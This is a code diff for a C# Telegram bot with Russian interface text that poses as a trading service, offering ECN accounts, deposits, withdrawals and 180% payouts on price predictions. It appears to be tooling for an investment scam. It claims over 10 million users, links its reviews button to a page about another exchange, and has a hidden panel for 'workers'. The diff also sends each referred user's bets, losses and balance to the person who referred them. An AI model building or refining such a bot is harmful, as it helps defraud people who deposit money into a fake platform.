@@ -177,33 +177,52 @@ class TGBot
 
             if (message.Text.StartsWith("/start") && !user.waitUpdateBetThread)
             {
-                DisableChecks(user);
-
-                InlineKeyboardMarkup inlineKeyboard = new(new[]{
-                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
-                });
-
-                if (!user.IsWorker)
+                if(user.idMessage == null)
                 {
-                    inlineKeyboard = new(new[]{
+                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
                         new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
                         new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
                         new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
                         new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") }
                     });
+
+                    user.idMessage = await botClient.SendTextMessageAsync(
+                        chatId: message.Chat.Id,
+                        text: $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}",
+                        cancellationToken: cancellationToken,
+                        parseMode: ParseMode.Html,
+                        replyMarkup: inlineKeyboard);
                 }
                 else
                 {
-                    inlineKeyboard = new(new[]{
+                    DisableChecks(user);
+
+                    InlineKeyboardMarkup inlineKeyboard = new(new[]{
+                    new[] {InlineKeyboardButton.WithCallbackData("🔙 Вернутся в главное меню", $"{user.Id}loadMenu") }
+                });
+
+                    if (!user.IsWorker)
+                    {
+                        inlineKeyboard = new(new[]{
+                        new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
+                        new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
+                        new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
+                        new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") }
+                    });
+                    }
+                    else
+                    {
+                        inlineKeyboard = new(new[]{
                         new [] { InlineKeyboardButton.WithCallbackData("🧮 Открыть ECN счёт", $"{user.Id}createECNAccount") },
                         new [] { InlineKeyboardButton.WithCallbackData("💳 Внести средства", $"{user.Id}deposit") },
                         new [] { InlineKeyboardButton.WithCallbackData("🏦 Вывести средства", $"{user.Id}withdraw") },
                         new [] { InlineKeyboardButton.WithUrl(text: "📒 Отзывы о нас", url: "https://crypto.ru/otzyvy-poloniex/"), InlineKeyboardButton.WithCallbackData("👨‍💻 Тех Поддерджка", $"{user.Id}techSupport") },
                         new [] { InlineKeyboardButton.WithCallbackData("Панель админа/работника", $"{user.Id}workerAdminPanel") }
                     });
-                }
+                    }
 
-                SendMessageWithButtons(user, cancellationToken, $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}", inlineKeyboard);
+                    SendMessageWithButtons(user, cancellationToken, $"👤Личный кабинет: @{message.Chat.Username}\n<i>🔎 TlgmID: {chatId}</i>\n\n💰 Баланс: <i>{user.Balance} ₽</i>\n🤝🏻 Кол-во сделок: <i>{user.NumOfTransactions}</i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nRUB 🟢 ➗    KZT  🟢 ➗    UAH 🟢\nUSD 🟢 ➗    EUR  🟢 ➗    PLN  🟢\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🔸 C нами уже более 10⁷ пользователей 🔸\n\n📅 Дата регистрации: {user.DateOfRegister.ToLongDateString()}   {user.DateOfRegister.ToLongTimeString()}", inlineKeyboard);
+                }
 
                 if (message.Text.Length > 6)
                 {
@@ -339,13 +358,24 @@ class TGBot
         {
             var callbackData = callbackQuery.Data; // Текст который вернула инлайн-кнопка
             //Environment.Exit(0);
-            var user = USER(long.Parse(callbackData[..9]));
+
+            UserData user = null;
+            int iId = 0;
+
+            for (int i = 0; i < 20; i++)
+            {
+                long id = 0;
+                if(long.TryParse(callbackData[..i], out id)) user = USER(id);
+                if (user != null) { iId = i; break; }
+            }
+
+            
             //var user = USER(409013849);
 
 
-            if (user.idMessage != null)
+            if (user != null && user.idMessage != null)
             {
-                SendButtons(botClient, user.idMessage, cancellationToken, callbackData[9..]);
+                SendButtons(botClient, user.idMessage, cancellationToken, callbackData[iId..]);
             }
         }
     }
@@ -652,6 +682,7 @@ class TGBot
 
     async void SendMessage(UserData user, CancellationToken cancellationToken, string text)
     {
+        if (user.idMessage == null) return;
         try { await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId); } catch { }
         user.idMessage = await botClient.SendTextMessageAsync(
                     chatId: user.idMessage.Chat.Id,
@@ -662,6 +693,7 @@ class TGBot
 
     async void SendMessageWithoutDelete(UserData user, CancellationToken cancellationToken, string text)
     {
+        if (user.idMessage == null) return;
         await botClient.SendTextMessageAsync(
             chatId: user.idMessage.Chat.Id,
             text: text,
@@ -671,7 +703,9 @@ class TGBot
 
     async void SendMessageWithButtons(UserData user, CancellationToken cancellationToken, string text, InlineKeyboardMarkup inlineKeyboard)
     {
-        try { await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId); } catch { }
+        if (user.idMessage == null) return;
+
+        try {  await botClient.DeleteMessageAsync(user.idMessage.Chat.Id, user.idMessage.MessageId); } catch { }
         user.idMessage = await botClient.SendTextMessageAsync(
                     chatId: user.idMessage.Chat.Id,
                     text: text,
@@ -736,7 +770,7 @@ class TGBot
         if(yourRefferals.Count > 0) // РАССЫЛКА ВСЕМ РЕФЕРАЛАМ
             foreach(var reff in yourRefferals)
                 if (reff.idMessage != null && reff != user)
-                    SendMessage(user, cancellationToken, $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\nБаланс реферала: {user.Balance}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}");
+                    SendMessage(reff, cancellationToken, $"Имя пользователя: <i>@{user.Username}</i>\nTelegramID: <i>{user.Id}</i>\n\nИнвестиция в актив: <i>{user.SelectedAsset}</i>\nСумма инвестиции: <i>{user.InvestmentAmount} ₽</i>\nПрогноз пользователя: <i>{user.CourseDirection}</i>\nПроцент при успешном прогнозе: <i><u>180%</u></i>\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\nИзменения актива: {user.SelectedAsset}\n\nКурс изменился: {courseChanged}\n{(betClosed ? "Прибыль" : "Убыток")} составляет: {(betClosed ? user.InvestmentAmount * 0.8 : user.InvestmentAmount)}\nБаланс реферала: {user.Balance}\n🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰🟰\n🗓 {DateTime.Now.ToShortDateString()}, {DateTime.Now.ToLongTimeString()}");
 
         user.InvestmentAmount = 0;
         user.SelectedAsset = string.Empty;
